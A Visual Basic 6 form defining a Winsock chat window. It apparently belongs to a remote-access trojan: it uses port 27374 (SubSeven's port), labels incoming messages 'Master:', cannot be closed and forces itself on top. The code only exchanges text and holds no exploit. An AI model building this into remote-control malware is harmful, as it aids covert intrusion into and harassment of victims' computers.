VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmChat 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Chat Window"
   ClientHeight    =   3690
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   6030
   ControlBox      =   0   'False
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3690
   ScaleWidth      =   6030
   StartUpPosition =   2  'CenterScreen
   Begin MSWinsockLib.Winsock Chat 
      Left            =   4440
      Top             =   3120
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      RemotePort      =   27374
   End
   Begin VB.CommandButton cmdSend 
      Caption         =   "Send"
      Height          =   375
      Left            =   5040
      TabIndex        =   2
      Top             =   3240
      Width           =   975
   End
   Begin VB.TextBox txtSend 
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   405
      Left            =   0
      TabIndex        =   1
      Top             =   3240
      Width           =   5055
   End
   Begin VB.TextBox txtChat 
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   3135
      Left            =   0
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      Top             =   0
      Width           =   6015
   End
End
Attribute VB_Name = "frmChat"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Const HWND_TOPMOST = -&H1
Private Const HWND_NOTOPMOST = -&H2
Private Const SWP_NOSIZE = &H1
Private Const SWP_NOMOVE = &H2
'------------------
Private Declare Sub SetWindowPos Lib "user32" (ByVal hWnd As Long, _
    ByVal hWndInsertAfter As Long, ByVal x As Long, _
    ByVal y As Long, ByVal cx As Long, ByVal cy As Long, _
    ByVal wFlags As Long)
'------------------
Private bOnTopState     As Boolean
Public Property Let AlwaysOnTop(bState As Boolean)
    Dim lFlag As Long
    On Error Resume Next
    If bState = True Then
        lFlag = HWND_TOPMOST
    Else
        lFlag = HWND_NOTOPMOST
    End If
    bOnTopState = bState
    Call SetWindowPos(Me.hWnd, lFlag, 0&, 0&, 0&, 0&, _
        (SWP_NOSIZE Or SWP_NOMOVE))
End Property
Public Property Get AlwaysOnTop() As Boolean
    AlwaysOnTop = bOnTopState
End Property
Private Sub Chat_DataArrival(ByVal bytesTotal As Long)
    Dim inchat As String
    Call Chat.GetData(inchat)
    txtChat.Text = txtChat.Text & "Master: " & inchat & vbCrLf
    txtChat.SelLength = Len(txtChat.Text)
    Beep
End Sub

Private Sub Chat_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Chat.Close

End Sub

Private Sub cmdSend_Click()
    Dim outchat As String
    outchat = txtSend.Text
    Call Chat.SendData(outchat)
    txtSend.Text = ""
    txtChat.Text = txtChat.Text & "You Say: " & outchat & vbCrLf
    txtChat.SelLength = Len(txtChat.Text)
    Beep
    
End Sub

Private Sub Form_Load()
    frmChat.AlwaysOnTop = True
End Sub

Private Sub txtSend_KeyPress(KeyAscii As Integer)
    If KeyAscii = vbKeyReturn Then
        KeyAscii = 0
        Call cmdSend_Click
    End If
End Sub
